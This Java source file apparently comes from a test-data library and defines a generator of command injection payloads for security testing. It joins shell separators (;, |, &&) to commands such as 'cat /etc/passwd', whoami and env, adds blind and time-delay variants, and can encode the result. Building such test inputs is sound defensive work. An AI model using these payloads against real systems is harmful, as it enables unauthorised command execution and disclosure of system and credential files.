package com.dataforge.generators.internal;

import com.dataforge.core.DataForgeContext;
import com.dataforge.generators.spi.DataGenerator;
import com.dataforge.model.FieldConfig;
import java.security.SecureRandom;
import java.util.Arrays;
import java.util.List;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

/**
 * 命令注入生成器
 *
 * <p>生成各种命令注入测试payload，用于安全测试、渗透测试等场景。
 *
 * <p>支持的参数：
 *
 * <ul>
 *   <li>os_type: 操作系统类型 (LINUX|WINDOWS|UNIX|GENERIC) 默认: LINUX
 *   <li>injection_type: 注入类型 (BLIND|TIME|OUTPUT|ERROR) 默认: OUTPUT
 *   <li>command: 执行命令 (WHOAMI|ID|LS|CAT|PING|CUSTOM) 默认: WHOAMI
 *   <li>separator: 命令分隔符 (SEMICOLON|PIPE|AND|OR|NEWLINE) 默认: SEMICOLON
 *   <li>encoding: 编码方式 (NONE|URL|BASE64|HEX) 默认: NONE
 * </ul>
 *
 * @author DataForge Team
 * @since 1.0.0
 */
public class CommandInjectionGenerator extends BaseGenerator
    implements DataGenerator<String, FieldConfig> {

  private static final Logger logger = LoggerFactory.getLogger(CommandInjectionGenerator.class);
  private static final SecureRandom random = new SecureRandom();

  // Linux/Unix命令
  private static final List<String> LINUX_COMMANDS =
      Arrays.asList(
          "whoami",
          "id",
          "pwd",
          "ls",
          "cat /etc/passwd",
          "uname -a",
          "ps aux",
          "netstat -an",
          "ifconfig",
          "env");

  // Windows命令
  private static final List<String> WINDOWS_COMMANDS =
      Arrays.asList(
          "whoami",
          "dir",
          "type",
          "systeminfo",
          "tasklist",
          "netstat -an",
          "ipconfig",
          "set",
          "ver");

  // 命令分隔符
  private static final String[] SEPARATORS = {";", "|", "&&", "||", "\n", "&"};

  // 时间延迟命令
  private static final List<String> TIME_DELAY_LINUX =
      Arrays.asList("sleep 5", "ping -c 5 127.0.0.1", "timeout 5");

  private static final List<String> TIME_DELAY_WINDOWS =
      Arrays.asList("timeout 5", "ping -n 5 127.0.0.1", "waitfor /t 5 dummy");

  @Override
  public String getType() {
    return "command_injection";
  }

  @Override
  public Class<FieldConfig> getConfigClass() {
    return FieldConfig.class;
  }

  @Override
  public String generate(FieldConfig config, DataForgeContext context) {
    try {
      String osType = getStringParam(config, "os_type", "LINUX").toUpperCase();
      String injectionType = getStringParam(config, "injection_type", "OUTPUT").toUpperCase();
      String command = getStringParam(config, "command", "WHOAMI").toUpperCase();
      String separator = getStringParam(config, "separator", "SEMICOLON").toUpperCase();
      String encoding = getStringParam(config, "encoding", "NONE").toUpperCase();

      String payload = generatePayload(osType, injectionType, command, separator);
      payload = applyEncoding(payload, encoding);

      // 存储到上下文
      context.put("command_injection_os", osType);
      context.put("command_injection_type", injectionType);
      context.put("command_injection_payload", payload);

      return payload;

    } catch (Exception e) {
      logger.error("Failed to generate command injection payload", e);
      return "; whoami";
    }
  }

  private String generatePayload(
      String osType, String injectionType, String command, String separator) {
    String baseCommand = selectCommand(osType, command);
    String sep = getSeparator(separator);

    switch (injectionType) {
      case "BLIND":
        return generateBlindPayload(baseCommand, sep, osType);
      case "TIME":
        return generateTimePayload(sep, osType);
      case "ERROR":
        return generateErrorPayload(baseCommand, sep, osType);
      case "OUTPUT":
      default:
        return generateOutputPayload(baseCommand, sep);
    }
  }

  private String selectCommand(String osType, String command) {
    List<String> commands;

    switch (osType) {
      case "WINDOWS":
        commands = WINDOWS_COMMANDS;
        break;
      case "LINUX":
      case "UNIX":
      case "GENERIC":
      default:
        commands = LINUX_COMMANDS;
        break;
    }

    if ("CUSTOM".equals(command)) {
      return commands.get(random.nextInt(commands.size()));
    }

    // 根据命令类型选择具体命令
    switch (command) {
      case "WHOAMI":
        return "whoami";
      case "ID":
        return osType.equals("WINDOWS") ? "whoami" : "id";
      case "LS":
        return osType.equals("WINDOWS") ? "dir" : "ls";
      case "CAT":
        return osType.equals("WINDOWS") ? "type" : "cat /etc/passwd";
      case "PING":
        return osType.equals("WINDOWS") ? "ping 127.0.0.1" : "ping -c 1 127.0.0.1";
      default:
        return commands.get(random.nextInt(commands.size()));
    }
  }

  private String getSeparator(String separator) {
    switch (separator) {
      case "SEMICOLON":
        return ";";
      case "PIPE":
        return "|";
      case "AND":
        return "&&";
      case "OR":
        return "||";
      case "NEWLINE":
        return "\n";
      default:
        return SEPARATORS[random.nextInt(SEPARATORS.length)];
    }
  }

  private String generateOutputPayload(String command, String separator) {
    return separator + " " + command;
  }

  private String generateBlindPayload(String command, String separator, String osType) {
    // 盲注通常通过重定向输出到文件或网络
    String redirect = osType.equals("WINDOWS") ? " > nul" : " > /dev/null";
    return separator + " " + command + redirect;
  }

  private String generateTimePayload(String separator, String osType) {
    List<String> timeCommands = osType.equals("WINDOWS") ? TIME_DELAY_WINDOWS : TIME_DELAY_LINUX;
    String timeCommand = timeCommands.get(random.nextInt(timeCommands.size()));
    return separator + " " + timeCommand;
  }

  private String generateErrorPayload(String command, String separator, String osType) {
    // 错误注入通常通过执行不存在的命令或错误参数
    String errorCommand = osType.equals("WINDOWS") ? "invalidcmd" : "nonexistentcommand";
    return separator + " " + command + " || " + errorCommand;
  }

  private String applyEncoding(String payload, String encoding) {
    switch (encoding) {
      case "URL":
        return urlEncode(payload);
      case "BASE64":
        return base64Encode(payload);
      case "HEX":
        return hexEncode(payload);
      case "NONE":
      default:
        return payload;
    }
  }

  private String urlEncode(String payload) {
    return payload
        .replace(" ", "%20")
        .replace(";", "%3B")
        .replace("&", "%26")
        .replace("|", "%7C")
        .replace("=", "%3D")
        .replace("/", "%2F");
  }

  private String base64Encode(String payload) {
    // 简单的Base64编码
    StringBuilder base64 = new StringBuilder();
    String chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    byte[] bytes = payload.getBytes();

    for (int i = 0; i < bytes.length; i += 3) {
      int b1 = bytes[i] & 0xFF;
      int b2 = (i + 1 < bytes.length) ? bytes[i + 1] & 0xFF : 0;
      int b3 = (i + 2 < bytes.length) ? bytes[i + 2] & 0xFF : 0;

      int combined = (b1 << 16) | (b2 << 8) | b3;

      base64.append(chars.charAt((combined >> 18) & 0x3F));
      base64.append(chars.charAt((combined >> 12) & 0x3F));
      base64.append((i + 1 < bytes.length) ? chars.charAt((combined >> 6) & 0x3F) : '=');
      base64.append((i + 2 < bytes.length) ? chars.charAt(combined & 0x3F) : '=');
    }

    return base64.toString();
  }

  private String hexEncode(String payload) {
    StringBuilder hex = new StringBuilder();
    for (char c : payload.toCharArray()) {
      hex.append(String.format("\\x%02x", (int) c));
    }
    return hex.toString();
  }
}
